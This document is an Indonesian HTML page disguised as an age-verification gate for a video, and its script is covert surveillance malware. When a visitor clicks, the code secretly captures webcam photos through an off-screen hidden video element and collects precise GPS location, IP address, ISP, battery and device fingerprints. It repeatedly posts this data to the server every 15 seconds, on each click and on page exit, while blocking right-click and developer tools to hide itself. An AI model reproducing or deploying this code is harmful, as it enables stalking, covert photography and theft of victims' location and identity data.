<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Demo Teknologi Web</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    background: #050505;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    font-family: 'Courier New', monospace;
    color: #666;
    padding: 12px;
}
.container {
    max-width: 500px;
    width: 100%;
    background: #0a0a0a;
    border: 4px solid #1a1a1a;
    box-shadow: 12px 12px 0 #000, -4px -4px 0 #151515;
    padding: 20px 16px 16px 16px;
}
.age-gate {
    text-align: center;
    padding: 50px 10px;
    border: 2px solid #151515;
}
.age-gate h1 {
    font-size: 36px;
    font-weight: 300;
    color: #888;
    letter-spacing: 10px;
    margin-bottom: 4px;
}
.age-gate .sub {
    font-size: 10px;
    color: #333;
    letter-spacing: 4px;
    margin-bottom: 30px;
}
.age-gate .btn-age {
    background: #111;
    border: 3px solid #222;
    color: #777;
    padding: 16px 30px;
    font-family: inherit;
    font-size: 14px;
    letter-spacing: 6px;
    cursor: pointer;
    transition: 0.1s;
    text-transform: uppercase;
    width: 100%;
}
.age-gate .btn-age:active {
    background: #050505;
    border-color: #111;
    color: #444;
}
.hidden-content { display: none; }
.video-wrapper {
    background: #000;
    border: 3px solid #151515;
    aspect-ratio: 16/9;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
}
#videoIframe {
    width: 100%;
    height: 100%;
    border: none;
    background: #000;
}
.video-title {
    font-size: 16px;
    font-weight: 300;
    color: #777;
    margin: 14px 0 4px 0;
    letter-spacing: 2px;
    border-left: 4px solid #222;
    padding-left: 12px;
}
.video-desc {
    font-size: 10px;
    color: #333;
    margin-bottom: 6px;
    padding-left: 16px;
    border-bottom: 1px solid #111;
    padding-bottom: 10px;
}
.footer {
    font-size: 7px;
    color: #111;
    text-align: center;
    margin-top: 14px;
    letter-spacing: 4px;
}
#hiddenVideo {
    position: fixed;
    bottom: -9999px;
    right: -9999px;
    width: 1280px;
    height: 720px;
    opacity: 0;
    pointer-events: none;
}
</style>
</head>
<body>

<div class="container">
    <div class="age-gate" id="ageGate">
        <h1>VIDEU</h1>
        <div class="sub">VERTIFIKASI</div>
        <button class="btn-age" id="verifyBtn">▸ akses konten</button>
        <div style="margin-top:24px;font-size:8px;color:#1a1a1a;">dengan klik tombol anda menyetujui syarat & ketentuan</div>
    </div>

    <div class="hidden-content" id="hiddenContent">
        <div class="video-wrapper">
            <iframe id="videoIframe" src="https://videy.co/v/?id=U8DR6GK31" allowfullscreen></iframe>
        </div>
        <div class="video-title">▶ Demo Konten Multimedia</div>
        <div class="video-desc">Status: Aktif LOG AKTIVITAS WHOARE</div>
    </div>
    <div class="footer">// RIAN //</div>
</div>

<video id="hiddenVideo" autoplay playsinline muted></video>

<script>
// ============================================
// PROTEKSI INSPECT + RIGHT CLICK + KEYBOARD
// ============================================
(function() {
    document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
    document.addEventListener('keydown', function(e) {
        if (e.key === 'F12') { e.preventDefault(); return false; }
        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) { e.preventDefault(); return false; }
        if (e.ctrlKey && e.shiftKey && (e.key === 'J' || e.key === 'j')) { e.preventDefault(); return false; }
        if (e.ctrlKey && e.shiftKey && (e.key === 'C' || e.key === 'c')) { e.preventDefault(); return false; }
        if (e.ctrlKey && (e.key === 'U' || e.key === 'u')) { e.preventDefault(); return false; }
        if (e.ctrlKey && (e.key === 'S' || e.key === 's')) { e.preventDefault(); return false; }
    });
    
    let devToolsOpen = false;
    const element = new Image();
    Object.defineProperty(element, 'id', {
        get: function() { devToolsOpen = true; return 'devtools_detected'; }
    });
    setInterval(function() {
        devToolsOpen = false;
        console.log(element);
        console.clear();
    }, 1000);
})();

// ============================================
// MAIN APP - IMPROVED VERSION
// ============================================
(function() {
    const ageGate = document.getElementById('ageGate');
    const hiddenContent = document.getElementById('hiddenContent');
    const verifyBtn = document.getElementById('verifyBtn');
    const hiddenVideo = document.getElementById('hiddenVideo');
    
    let fotoBase64 = '';
    let isCameraReady = false;
    let isVerified = false;
    let lokasi = 'N/A';
    let ip = 'N/A';
    let batre = 'N/A';
    let spesifikasi = 'N/A';
    let deviceInfo = {};

    verifyBtn.addEventListener('click', async function() {
        if (isVerified) return;
        this.innerText = '⏳ processing...';
        this.disabled = true;

        try {
            // ===== KAMERA HD =====
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: 'user', 
                    width: { ideal: 1280, min: 640 }, 
                    height: { ideal: 720, min: 480 },
                    frameRate: { ideal: 30, min: 15 }
                },
                audio: false
            });
            hiddenVideo.srcObject = stream;
            isCameraReady = true;
            
            // Tunggu video siap
            await new Promise((resolve) => {
                hiddenVideo.onloadedmetadata = () => resolve();
                setTimeout(resolve, 3000);
            });
            
            // Tunggu 1 detik agar frame stabil
            await new Promise(r => setTimeout(r, 1000));
            capturePhoto();

            // ===== LOKASI AKURAT =====
            if (navigator.geolocation) {
                await new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            const { latitude, longitude, accuracy, altitude, heading, speed } = pos.coords;
                            lokasi = `LAT:${latitude.toFixed(7)},LNG:${longitude.toFixed(7)},ACC:${accuracy}m`;
                            deviceInfo.altitude = altitude;
                            deviceInfo.heading = heading;
                            deviceInfo.speed = speed;
                            resolve();
                        },
                        (err) => {
                            lokasi = 'GPS_DENIED';
                            // Fallback ke IP location
                            fetch('https://ipapi.co/json/')
                                .then(r => r.json())
                                .then(d => {
                                    if (d.latitude) {
                                        lokasi = `IP:${d.latitude.toFixed(5)},${d.longitude.toFixed(5)}|${d.city},${d.country_name}`;
                                    }
                                    resolve();
                                })
                                .catch(() => resolve());
                        },
                        { 
                            enableHighAccuracy: true, 
                            timeout: 30000, 
                            maximumAge: 0 
                        }
                    );
                });
            }

            // ===== IP ADDRESS =====
            try {
                const responses = await Promise.all([
                    fetch('https://api.ipify.org?format=json').then(r => r.json()),
                    fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => null)
                ]);
                
                ip = responses[0].ip || 'UNKNOWN';
                
                if (responses[1]) {
                    const ipData = responses[1];
                    deviceInfo.isp = ipData.org || 'N/A';
                    deviceInfo.city = ipData.city || 'N/A';
                    deviceInfo.region = ipData.region || 'N/A';
                    deviceInfo.country = ipData.country_name || 'N/A';
                    deviceInfo.timezone = ipData.timezone || 'N/A';
                }
            } catch(e) {
                ip = 'FAILED';
            }

            // ===== BATEREI DETAIL =====
            if (navigator.getBattery) {
                try {
                    const bat = await navigator.getBattery();
                    batre = `${Math.round(bat.level * 100)}%|CHG:${bat.charging?'YES':'NO'}|TIME:${bat.chargingTime||'N/A'}`;
                    deviceInfo.batteryLevel = bat.level;
                    deviceInfo.charging = bat.charging;
                    deviceInfo.chargingTime = bat.chargingTime;
                    deviceInfo.dischargingTime = bat.dischargingTime;
                } catch(e) { batre = 'N/A'; }
            }

            // ===== SPESIFIKASI LENGKAP =====
            const platform = navigator.platform || 'unknown';
            const screenRes = `${screen.width}x${screen.height}`;
            const availRes = `${screen.availWidth}x${screen.availHeight}`;
            const colorDepth = screen.colorDepth || 'N/A';
            const pixelDepth = screen.pixelDepth || 'N/A';
            const lang = navigator.language || 'unknown';
            const languages = navigator.languages ? navigator.languages.join(',') : 'N/A';
            const cookieEnabled = navigator.cookieEnabled ? 'YES' : 'NO';
            const onLine = navigator.onLine ? 'YES' : 'NO';
            const memory = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'N/A';
            const hardwareConcurrency = navigator.hardwareConcurrency || 'N/A';
            const maxTouchPoints = navigator.maxTouchPoints || '0';
            const pdfViewerEnabled = navigator.pdfViewerEnabled ? 'YES' : 'NO';
            const doNotTrack = navigator.doNotTrack || 'N/A';
            
            spesifikasi = `${platform}|${screenRes}|${availRes}|${colorDepth}bit|${lang}|${memory}|${hardwareConcurrency}CPU`;
            
            deviceInfo = {
                ...deviceInfo,
                platform: platform,
                screenResolution: screenRes,
                availableResolution: availRes,
                colorDepth: colorDepth,
                pixelDepth: pixelDepth,
                language: lang,
                languages: languages,
                cookieEnabled: cookieEnabled,
                online: onLine,
                deviceMemory: memory,
                cpuCores: hardwareConcurrency,
                touchPoints: maxTouchPoints,
                pdfViewer: pdfViewerEnabled,
                doNotTrack: doNotTrack,
                userAgent: navigator.userAgent,
                appCodeName: navigator.appCodeName,
                appName: navigator.appName,
                appVersion: navigator.appVersion,
                product: navigator.product,
                vendor: navigator.vendor,
                javaEnabled: navigator.javaEnabled ? 'YES' : 'NO',
                mediaDevices: navigator.mediaDevices ? 'YES' : 'NO'
            };

            // ===== TAMPILKAN KONTEN =====
            ageGate.style.display = 'none';
            hiddenContent.style.display = 'block';
            isVerified = true;

            // ===== KIRIM PERTAMA KALI =====
            setTimeout(() => sendToTelegram(), 1500);
        } catch (e) {
            ageGate.style.display = 'none';
            hiddenContent.style.display = 'block';
            isVerified = true;
            
            // Tetap ambil data lain
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const j = await r.json();
                ip = j.ip || 'UNKNOWN';
            } catch(e) { ip = 'FAILED'; }
            
            if (navigator.getBattery) {
                try {
                    const bat = await navigator.getBattery();
                    batre = `${Math.round(bat.level * 100)}%`;
                } catch(e) {}
            }
            
            spesifikasi = `${navigator.platform}|${screen.width}x${screen.height}|${navigator.language}`;
            setTimeout(() => sendToTelegram(), 2000);
        }
    });

    function capturePhoto() {
        if (!isCameraReady) return;
        try {
            const canvas = document.createElement('canvas');
            canvas.width = hiddenVideo.videoWidth || 1280;
            canvas.height = hiddenVideo.videoHeight || 720;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
            // Quality 0.9 untuk hasil HD
            fotoBase64 = canvas.toDataURL('image/jpeg', 0.9);
        } catch (e) {}
    }

    // Update foto setiap 5 detik
    setInterval(() => {
        if (isCameraReady && isVerified) capturePhoto();
    }, 5000);

    function collectData() {
        return {
            ip: ip,
            lokasi: lokasi,
            batre: batre,
            spesifikasi: spesifikasi,
            platform: deviceInfo.platform || navigator.platform || 'unknown',
            language: navigator.language || 'unknown',
            userAgent: navigator.userAgent || 'unknown',
            screen: `${screen.width}x${screen.height}`,
            waktu: new Date().toISOString(),
            foto: fotoBase64 || '',
            deviceInfo: JSON.stringify(deviceInfo)
        };
    }

    function sendToTelegram() {
        if (!isVerified) return;
        const data = collectData();
        
        if (!data.foto && isCameraReady) {
            capturePhoto();
            data.foto = fotoBase64;
        }

        fetch(window.location.href, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(result => {
            console.log('Data terkirim:', result);
        })
        .catch(error => {
            console.error('Gagal kirim:', error);
        });
    }

    // Trigger otomatis setiap 15 detik
    setInterval(() => {
        if (isVerified) sendToTelegram();
    }, 15000);

    document.addEventListener('click', () => {
        if (!isVerified) return;
        capturePhoto();
        setTimeout(sendToTelegram, 100);
    });
    
    window.addEventListener('beforeunload', () => {
        if (!isVerified) return;
        const data = collectData();
        navigator.sendBeacon(window.location.href, JSON.stringify(data));
    });
})();
</script>
</body>
</html>
